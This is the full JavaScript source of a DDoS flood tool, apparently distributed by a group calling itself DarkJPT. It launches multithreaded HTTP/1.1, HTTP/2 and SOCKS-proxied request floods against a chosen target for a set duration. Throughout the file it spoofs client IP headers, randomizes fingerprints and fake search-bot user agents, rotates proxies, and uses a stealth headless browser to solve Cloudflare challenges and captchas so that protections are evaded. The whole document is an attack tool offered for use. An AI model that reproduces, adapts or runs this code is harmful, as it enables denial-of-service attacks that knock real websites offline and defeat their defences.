//tool by DarkJPT team DarkNetJPT®

const http = require('http');
const https = require('https');
const fs = require('fs');
const net = require('net');
const url = require('url');
const crypto = require('crypto');
const tls = require('tls');
const { Socket } = require('net');
const http2 = require('http2');
const cluster = require('cluster');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

let updateCheckComplete = false;
try {
    const Updater = require('./up.js');
    const updater = new Updater();
    updater.checkUpdate().then(success => {
        updateCheckComplete = true;
        if (!success) process.exit(1);
    }).catch(() => {
        updateCheckComplete = true;
    });
} catch (error) {
    console.log('\nYêu cầu file up.js để nhận những bản nâng cấp');
    updateCheckComplete = true;
}
while (!updateCheckComplete) {
    require('deasync').sleep(100);
}

class TokenBucket {
    constructor(rate, burst) {
        this.rate = rate;
        this.burst = burst;
        this.tokens = burst;
        this.lastRefill = Date.now();
    }
    take() {
        this.refill();
        if (this.tokens > 0) {
            this.tokens--;
            return true;
        }
        return false;
    }
    refill() {
        const now = Date.now();
        const elapsed = (now - this.lastRefill) / 1000;
        this.tokens = Math.min(this.burst, this.tokens + elapsed * this.rate);
        this.lastRefill = now;
    }
}

class JSBypass {
    constructor() {
        this.stats = { requests: 0, errors: 0, success: 0, blocked: 0, bypassed: 0, cfSolved: 0 };
        this.startTime = Date.now();
        this.currentVersion = "2.0.0-ULTRA";
        this.proxies = [];
        this.cookieJar = new Map();
        this.http2Sessions = new Map();
        this.rateBuckets = new Map();
    }

    generateFingerprint() {
        const fonts = ['Arial', 'Times', 'Helvetica', 'Courier', 'Verdana', 'Tahoma', 'Georgia', 'Comic Sans MS', 'Impact', 'Trebuchet MS'];
        const resolutions = ['1920x1080', '1366x768', '1536x864', '1440x900', '1280x720', '2560x1440', '1600x900', '1920x1200', '3840x2160', '1280x800'];
        const webgl = ['WebKit WebGL', 'Intel Inc.', 'NVIDIA Corporation', 'AMD', 'Apple GPU', 'ANGLE', 'Qualcomm'];
        const timezone = ['UTC', 'America/New_York', 'Europe/London', 'Asia/Tokyo', 'Asia/Shanghai', 'Australia/Sydney', 'Europe/Berlin'];
        const languages = [['en-US', 'en'], ['fr-FR', 'fr'], ['de-DE', 'de'], ['ja-JP', 'ja'], ['zh-CN', 'zh'], ['ru-RU', 'ru']];
        const langSet = languages[Math.floor(Math.random() * languages.length)];
        return {
            canvas: crypto.randomBytes(32).toString('hex'),
            webgl: webgl[Math.floor(Math.random() * webgl.length)] + ' ' + crypto.randomBytes(12).toString('hex'),
            fonts: fonts.sort(() => Math.random() - 0.5).slice(0, 5).join(', '),
            resolution: resolutions[Math.floor(Math.random() * resolutions.length)],
            timezone: timezone[Math.floor(Math.random() * timezone.length)],
            languages: langSet.join(', '),
            platform: ['Win32', 'MacIntel', 'Linux x86_64'][Math.floor(Math.random() * 3)],
            hardwareConcurrency: [2, 4, 8, 12, 16][Math.floor(Math.random() * 5)],
            deviceMemory: [2, 4, 8, 16][Math.floor(Math.random() * 4)]
        };
    }

    advancedBypassHeaders() {
        const fp = this.generateFingerprint();
        return {
            'X-Forwarded-For': `${this.generateRandomIP()}, ${this.generateRandomIP()}, ${this.generateRandomIP()}, ${this.generateRandomIP()}`,
            'X-Real-IP': this.generateRandomIP(),
            'X-Client-IP': this.generateRandomIP(),
            'X-Originating-IP': this.generateRandomIP(),
            'X-Cluster-Client-IP': this.generateRandomIP(),
            'X-Forwarded-Host': crypto.randomBytes(10).toString('hex') + '.com',
            'X-Forwarded-Proto': 'https',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRF-Token': crypto.randomBytes(32).toString('hex'),
            'CF-Connecting-IP': this.generateRandomIP(),
            'CF-IPCountry': ['US', 'GB', 'DE', 'FR', 'JP', 'CN', 'RU', 'BR', 'IN', 'CA'][Math.floor(Math.random() * 10)],
            'True-Client-IP': this.generateRandomIP(),
            'Accept-Charset': 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
            'Accept-Datetime': new Date().toUTCString(),
            'DNT': Math.random() > 0.5 ? '1' : '0',
            'Save-Data': Math.random() > 0.6 ? 'on' : 'off',
            'Device-Memory': fp.deviceMemory.toString(),
            'Viewport-Width': fp.resolution.split('x')[0],
            'Width': fp.resolution.split('x')[0],
            'Sec-CH-UA': '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': `"${fp.platform === 'Win32' ? 'Windows' : fp.platform === 'MacIntel' ? 'macOS' : 'Linux'}"`,
            'Sec-CH-UA-Arch': '"x86"',
            'Sec-CH-UA-Full-Version-List': '"Google Chrome";v="120.0.6099.199", "Chromium";v="120.0.6099.199", "Not=A?Brand";v="99.0.0.0"',
            'Priority': Math.random() > 0.5 ? 'u=1, i' : 'u=0',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': ['same-origin', 'same-site', 'cross-site', 'none'][Math.floor(Math.random() * 4)],
            'Sec-Fetch-Mode': ['navigate', 'no-cors', 'cors', 'websocket'][Math.floor(Math.random() * 4)],
            'Sec-Fetch-Dest': ['document', 'iframe', 'script', 'image', 'style'][Math.floor(Math.random() * 5)],
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive'
        };
    }

    generateRandomIP() {
        const octets = [];
        for (let i = 0; i < 4; i++) {
            let n = Math.floor(Math.random() * 256);
            if (i === 0 && n === 0) n = 1;
            if (i === 3 && n === 0) n = 1;
            octets.push(n);
        }
        return octets.join('.');
    }

    createSophisticatedPayload() {
        const payloads = [
            `{"query":"${crypto.randomBytes(12).toString('hex')}","variables":{"input":"${crypto.randomBytes(16).toString('hex')}"}}`,
            `search=${encodeURIComponent(crypto.randomBytes(14).toString('hex'))}&filter=${Math.random().toFixed(8)}&page=${Math.floor(Math.random() * 100)}`,
            `_=${Date.now()}&callback=jQuery${crypto.randomBytes(10).toString('hex')}_${Date.now()}&_=${Date.now() + 1}`,
            `formData=${btoa(crypto.randomBytes(24).toString('hex'))}&token=${crypto.randomBytes(20).toString('hex')}&ts=${Date.now()}`,
            `{"id":${Math.floor(Math.random() * 999999)},"jsonrpc":"2.0","method":"${crypto.randomBytes(6).toString('hex')}","params":{}}`,
            `q=${crypto.randomBytes(8).toString('hex')}&v=${Math.floor(Math.random() * 10)}&t=${Date.now()}`
        ];
        return payloads[Math.floor(Math.random() * payloads.length)];
    }

    loadProxies(file) {
        if (!fs.existsSync(file)) return [];
        const lines = fs.readFileSync(file, 'utf-8').split('\n').filter(line => line.trim() !== '');
        const proxies = [];
        for (let line of lines) {
            line = line.trim();
            if (!line || line.startsWith('#')) continue;
            const parts = line.split(':');
            if (parts.length < 2) continue;
            const ip = parts[0];
            const port = parseInt(parts[1]);
            const user = parts[2] || null;
            const pass = parts[3] || null;
            const type = parts[4] ? parts[4].toLowerCase() : 'http';
            if (isNaN(port)) continue;
            proxies.push({ ip, port, user, pass, type, alive: false });
        }
        this.proxies = proxies;
        return proxies;
    }

    async testProxy(proxy) {
        return new Promise(resolve => {
            const socket = new Socket();
            const timeout = setTimeout(() => {
                socket.destroy();
                resolve(false);
            }, 7000);
            socket.connect(proxy.port, proxy.ip, () => {
                clearTimeout(timeout);
                socket.write('GET / HTTP/1.1\r\nHost: httpbin.org\r\n\r\n');
                socket.on('data', () => {
                    socket.destroy();
                    resolve(true);
                });
            });
            socket.on('error', () => {
                clearTimeout(timeout);
                resolve(false);
            });
        });
    }

    async getRandomProxy() {
        if (this.proxies.length === 0) return null;
        const alive = this.proxies.filter(p => p.alive);
        if (alive.length === 0) {
            const random = this.proxies[Math.floor(Math.random() * this.proxies.length)];
            random.alive = await this.testProxy(random);
            return random.alive ? random : null;
        }
        return alive[Math.floor(Math.random() * alive.length)];
    }

    async portScanner(host, port, timeout = 5000) {
        return new Promise(resolve => {
            const socket = new Socket();
            const timer = setTimeout(() => {
                socket.destroy();
                resolve(false);
            }, timeout);
            socket.connect(port, host, () => {
                clearTimeout(timer);
                socket.destroy();
                resolve(true);
            });
            socket.on('error', () => {
                clearTimeout(timer);
                resolve(false);
            });
        });
    }

    async solveCfChallenge(targetUrl) {
        const browser = await puppeteer.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--disable-dev-shm-usage', '--no-zygote']
        });
        const page = await browser.newPage();
        await page.setUserAgent(this.getAdvancedUserAgent({}));
        await page.setExtraHTTPHeaders(this.advancedBypassHeaders());
        try {
            const response = await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 45000 });
            const urlAfter = page.url();
            if (response.status() === 503 || urlAfter.includes('cf-chl') || urlAfter.includes('captcha') || urlAfter.includes('challenge')) {
                await page.waitForTimeout(Math.floor(Math.random() * 3000) + 2000);
                await page.solveRecaptchas();
                await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 20000 });
                const cookies = await page.cookies();
                const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
                await browser.close();
                this.stats.cfSolved++;
                return { cookie: cookieStr, userAgent: await page.evaluate(() => navigator.userAgent) };
            }
        } catch (e) {
            console.log('CF bypass failed:', e.message);
        } finally {
            await browser.close();
        }
        return null;
    }

    async behavioralCheck() {
        const delays = [180, 420, 750, 1100, 1450, 2100];
        const delay = delays[Math.floor(Math.random() * delays.length)];
        await new Promise(r => setTimeout(r, delay));
        if (Math.random() > 0.65) {
            await new Promise(r => setTimeout(r, Math.floor(Math.random() * 800) + 300));
        }
        if (Math.random() > 0.8) {
            await new Promise(r => setTimeout(r, Math.floor(Math.random() * 1200) + 500));
        }
    }

    async smartRetry(fn, maxRetries = 4) {
        let lastError;
        for (let i = 0; i < maxRetries; i++) {
            try {
                return await fn();
            } catch (e) {
                lastError = e;
                await new Promise(r => setTimeout(r, 800 * (i + 1) + Math.floor(Math.random() * 500)));
            }
        }
        throw lastError;
    }

    mutatePayload(base) {
        if (!base) return '';
        const mutations = [
            () => base.replace(/[0-9a-f]{8,}/g, crypto.randomBytes(6).toString('hex')),
            () => base + `&rand=${crypto.randomBytes(8).toString('hex')}&ts=${Date.now()}`,
            () => btoa(base + crypto.randomBytes(12).toString('hex')),
            () => base.split('').map(c => Math.random() > 0.9 ? c.toUpperCase() : c).join(''),
            () => base.replace(/\d+/g, () => Math.floor(Math.random() * 9999).toString()),
            () => encodeURIComponent(base) + `&v=${Math.floor(Math.random() * 50)}`
        ];
        const chosen = mutations[Math.floor(Math.random() * mutations.length)];
        return chosen();
    }

    async advancedBypassRequest(target, options, proxy) {
        const protocol = target.protocol === 'https:' ? https : http;
        const bypassHeaders = this.advancedBypassHeaders();
        const fp = this.generateFingerprint();
        
        const reqOptions = {
            hostname: proxy ? proxy.ip : target.hostname,
            port: proxy ? proxy.port : (target.protocol === 'https:' ? 443 : 80),
            path: proxy ? target.href : this.generateAdvancedPath(options),
            method: this.getSmartMethod(options),
            headers: {
                'Host': target.hostname,
                'User-Agent': this.getAdvancedUserAgent(options),
                'Accept': this.getAcceptHeader(),
                'Accept-Language': fp.languages,
                'Accept-Encoding': 'gzip, deflate, br, zstd, compress',
                'Cache-Control': this.getCacheControl(options),
                'Connection': options.connect ? 'keep-alive' : 'close',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                ...bypassHeaders
            },
            servername: target.hostname,
            rejectUnauthorized: false,
            ALPNProtocols: ['http/1.1', 'h2'],
            ecdhCurve: 'auto',
            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305'
        };

        if (options.authorization) {
            const [type, value] = options.authorization.split(':');
            reqOptions.headers.Authorization = `${type} ${value.replace('%RANDA%', crypto.randomBytes(20).toString('hex'))}`;
        }

        if (options.cookie) {
            reqOptions.headers.Cookie = options.cookie.replace('%RANDA%', crypto.randomBytes(16).toString('hex'));
        } else if (this.cookieJar.has(target.hostname)) {
            reqOptions.headers.Cookie = this.cookieJar.get(target.hostname);
        }

        if (options.referer) {
            reqOptions.headers.Referer = options.referer === 'rand' ? 
                `https://${crypto.randomBytes(10).toString('hex')}.com/` : options.referer;
        }

        if (options.postdata && reqOptions.method === 'POST') {
            const mutated = this.mutatePayload(options.postdata);
            reqOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            reqOptions.headers['Content-Length'] = Buffer.byteLength(mutated);
        }

        return new Promise((resolve) => {
            const req = protocol.request(reqOptions, (res) => {
                this.handleResponse(res, options, resolve);
            });

            req.on('error', (error) => {
                this.stats.errors++;
                this.logError(`Request error: ${error.message}`);
                resolve(false);
            });

            req.setTimeout(12000, () => {
                req.destroy();
                this.stats.errors++;
                resolve(false);
            });

            if (options.postdata && reqOptions.method === 'POST') {
                req.write(this.mutatePayload(options.postdata));
            }

            req.end();
        });
    }

    generateAdvancedPath(options) {
        if (options.randpath) {
            const types = {
                1: `?cf__chl_tk=${crypto.randomBytes(20).toString('hex')}&ref=${crypto.randomBytes(8).toString('hex')}`,
                2: `?${crypto.randomBytes(10).toString('hex')}=${crypto.randomBytes(14).toString('hex')}&v=${Math.floor(Math.random() * 10)}`,
                3: `?q=${encodeURIComponent(crypto.randomBytes(12).toString('hex'))}&page=${Math.floor(Math.random() * 50)}`,
                4: `/${crypto.randomBytes(8).toString('hex')}/?${crypto.randomBytes(6).toString('hex')}=${crypto.randomBytes(10).toString('hex')}`,
                5: `/api/v${Math.floor(Math.random() * 6) + 1}/${crypto.randomBytes(10).toString('hex')}/query`,
                6: `/graphql?query=${crypto.randomBytes(12).toString('hex')}`,
                7: `/v2/${crypto.randomBytes(8).toString('hex')}/data`,
                8: `/.well-known/${crypto.randomBytes(6).toString('hex')}`
            };
            return types[options.randpath] || '/';
        }
        return '/';
    }

    getSmartMethod(options) {
        if (options.method === 'MIX') {
            const methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH', 'TRACE'];
            return methods[Math.floor(Math.random() * methods.length)];
        }
        return options.method || 'GET';
    }

    getAdvancedUserAgent(options) {
        if (options.fakebot) {
            const bots = [
                'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
                'TelegramBot (like TwitterBot)',
                'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
                'ChatGPT-User',
                'facebookexternalhit/1.1',
                'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
                'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/bot.html)',
                'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
            ];
            return bots[Math.floor(Math.random() * bots.length)];
        }

        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    getAcceptHeader() {
        const accepts = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'application/json, text/plain, */*',
            'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
            'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8, */*;q=0.1'
        ];
        return accepts[Math.floor(Math.random() * accepts.length)];
    }

    getCacheControl(options) {
        if (options.cache) {
            return 'no-cache, no-store, must-revalidate, proxy-revalidate, max-age=0';
        }
        return 'max-age=0, no-cache';
    }

    handleResponse(res, options, resolve) {
        this.stats.requests++;
        const status = res.statusCode || 444;

        if (status === 200 || status === 201 || status === 202 || status === 203 || status === 206) {
            this.stats.success++;
            if (status !== 200) this.stats.bypassed++;
        } else if (status === 403 || status === 429 || status === 503) {
            this.stats.blocked++;
            if (options.close) {
                res.destroy();
                return resolve(false);
            }
        } else if (status >= 300 && status < 400) {
            this.stats.bypassed++;
        } else if (status >= 500) {
            this.stats.errors++;
        }

        if (options.debug) {
            console.log(`[${new Date().toISOString()}] Status: ${status} | Req: ${this.stats.requests} | Success: ${this.stats.success} | Bypass: ${this.stats.bypassed}`);
        }

        res.on('data', () => {});
        res.on('end', () => resolve(true));
    }

    logError(message) {
        const errorMsg = `[${new Date().toISOString()}] ERROR: ${message}\n`;
        console.error(errorMsg);
        fs.appendFileSync('report.txt', errorMsg);
    }

    displayStats() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const rps = runtime > 0 ? (this.stats.requests / runtime).toFixed(2) : '0.00';
        const successRate = this.stats.requests > 0 ? ((this.stats.success / this.stats.requests) * 100).toFixed(2) : '0.00';
        console.log('\n' + '='.repeat(70));
        console.log(`JSBYPASS ULTRA - Version ${this.currentVersion}`);
        console.log('='.repeat(70));
        console.log(`Runtime: ${runtime}s | Threads: ${this.proxies.length > 0 ? this.proxies.filter(p => p.alive).length : 0} alive proxies`);
        console.log(`Total Requests: ${this.stats.requests}`);
        console.log(`Successful: ${this.stats.success}`);
        console.log(`Bypassed: ${this.stats.bypassed}`);
        console.log(`Blocked: ${this.stats.blocked}`);
        console.log(`Errors: ${this.stats.errors}`);
        console.log(`CF Solved: ${this.stats.cfSolved}`);
        console.log(`RPS: ${rps} | Success Rate: ${successRate}%`);
        console.log('='.repeat(70));
    }

    async http1FloodBypass(target, options, proxy) {
        await this.advancedBypassRequest(target, options, proxy);
    }

    async http2FloodBypass(target, options) {
        const sessionKey = target.hostname;
        let session = this.http2Sessions.get(sessionKey);
        if (!session || session.closed || session.destroyed) {
            try {
                session = http2.connect(target.href, {
                    createConnection: () => tls.connect({
                        host: target.hostname,
                        port: 443,
                        ALPNProtocols: ['h2'],
                        rejectUnauthorized: false,
                        ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256'
                    })
                });
                this.http2Sessions.set(sessionKey, session);
            } catch (e) {
                return;
            }
        }
        const stream = session.request({
            ':path': this.generateAdvancedPath(options),
            ':method': this.getSmartMethod(options),
            ...this.advancedBypassHeaders(),
            'user-agent': this.getAdvancedUserAgent(options),
            'cookie': this.cookieJar.get(target.hostname) || ''
        });
        stream.on('response', headers => this.handleResponse({ statusCode: headers[':status'] }, options, () => {}));
        stream.on('error', () => {});
        if (options.postdata) stream.write(this.mutatePayload(options.postdata));
        stream.end();
    }

    async socksProxyBypass(target, options, proxy) {
        return new Promise(resolve => {
            const socket = new Socket();
            socket.connect(proxy.port, proxy.ip);
            socket.on('connect', () => {
                const auth = proxy.user ? Buffer.from(`${proxy.user}:${proxy.pass}`) : null;
                const req = `GET ${target.href} HTTP/1.1\r\nHost: ${target.hostname}\r\n\r\n`;
                socket.write(req);
                socket.on('data', data => {
                    const match = data.toString().match(/HTTP\/1\.[01] (\d+)/);
                    this.handleResponse({ statusCode: match ? parseInt(match[1]) : 444 }, options, () => {});
                    resolve(true);
                });
            });
            socket.on('error', () => resolve(false));
            socket.setTimeout(10000, () => { socket.destroy(); resolve(false); });
        });
    }

    async rateControlBypass(workerId, rate) {
        const bucket = this.rateBuckets.get(workerId) || new TokenBucket(rate, 15);
        this.rateBuckets.set(workerId, bucket);
        while (!bucket.take()) {
            await new Promise(r => setTimeout(r, 5 + Math.floor(Math.random() * 10)));
        }
    }

    async sophisticatedAttack(target, options) {
        const port = target.port || (target.protocol === 'https:' ? 443 : 80);
        const portOpen = await this.portScanner(target.hostname, port);
        if (!portOpen) {
            console.log('Port closed or unreachable.');
            process.exit(1);
        }

        if (options.proxy && fs.existsSync(options.proxy)) {
            this.loadProxies(options.proxy);
            for (let p of this.proxies) {
                p.alive = await this.testProxy(p);
            }
        }

        if (options.advanced || Math.random() > 0.7) {
            const cf = await this.solveCfChallenge(target.href);
            if (cf) {
                this.cookieJar.set(target.hostname, cf.cookie);
                options.cookie = cf.cookie;
            }
        }

        const duration = parseInt(options.time) * 1000;
        const threads = parseInt(options.threads) || 1;
        const rate = parseInt(options.rate) || 100;

        console.log(`Target: ${target.href}`);
        console.log(`Method: ${options.method} | Threads: ${threads} | Rate: ${rate}ms | Proxies: ${this.proxies.filter(p => p.alive).length}`);
        console.log(`Advanced Bypass: ON | CF Solved: ${this.stats.cfSolved}`);

        const endTime = Date.now() + duration;
        let activeThreads = 0;

        const advancedWorker = async (workerId) => {
            while (Date.now() < endTime && this.stats.errors < 15000) {
                await this.rateControlBypass(workerId, threads / rate);
                await this.behavioralCheck();
                const proxy = await this.getRandomProxy();
                const bypassType = Math.floor(Math.random() * 100);

                try {
                    if (bypassType < 40) {
                        await this.http1FloodBypass(target, options, proxy);
                    } else if (bypassType < 70) {
                        await this.http2FloodBypass(target, options);
                    } else if (bypassType < 85 && proxy?.type.includes('socks')) {
                        await this.socksProxyBypass(target, options, proxy);
                    } else {
                        await this.advancedBypassRequest(target, options, proxy);
                    }

                    if (options.randrate) {
                        await new Promise(r => setTimeout(r, Math.floor(Math.random() * 300) + 50));
                    }
                } catch (e) {
                    this.stats.errors++;
                }

                if (workerId === 0 && this.stats.requests % 200 === 0) {
                    this.displayStats();
                }
            }
            activeThreads--;
        };

        for (let i = 0; i < threads; i++) {
            activeThreads++;
            advancedWorker(i);
        }

        const monitor = setInterval(() => {
            if (activeThreads === 0 && Date.now() >= endTime) {
                clearInterval(monitor);
                console.log('\nAttack completed!');
                this.displayStats();
                process.exit(0);
            }
        }, 1500);
    }
}

const args = process.argv.slice(2);
if (args.length < 6) {
    console.log('Usage: node hanh.js <METHOD> <target> <time> <threads> <rate> <proxy.txt> [options]');
    console.log('Example: node hanh.js MIX https://target.com 300 64 50 proxy.txt --randpath 5 --fakebot true --debug');
    process.exit(1);
}

const options = {
    method: args[0].toUpperCase(),
    time: args[2],
    threads: args[3],
    rate: args[4],
    proxy: args[5]
};

for (let i = 6; i < args.length; i++) {
    const flag = args[i];
    if (flag.startsWith('--')) {
        const key = flag.slice(2).replace(/-/g, '');
        if (i + 1 < args.length && !args[i + 1].startsWith('--')) {
            options[key] = args[++i];
        } else {
            options[key] = true;
        }
    }
}

const target = url.parse(args[1]);
if (!target.protocol) {
    target.protocol = 'https:';
    target.href = 'https://' + args[1];
}

const bypass = new JSBypass();

process.on('SIGINT', () => {
    console.log('\nAttack stopped by user');
    bypass.displayStats();
    process.exit(0);
});

if (options.advanced) {
    bypass.sophisticatedAttack(target, options).catch(error => {
        bypass.logError(`Attack failed: ${error.message}`);
        process.exit(1);
    });
} else {
    bypass.sophisticatedAttack(target, options).catch(error => {
        bypass.logError(`Attack failed: ${error.message}`);
        process.exit(1);
    });
}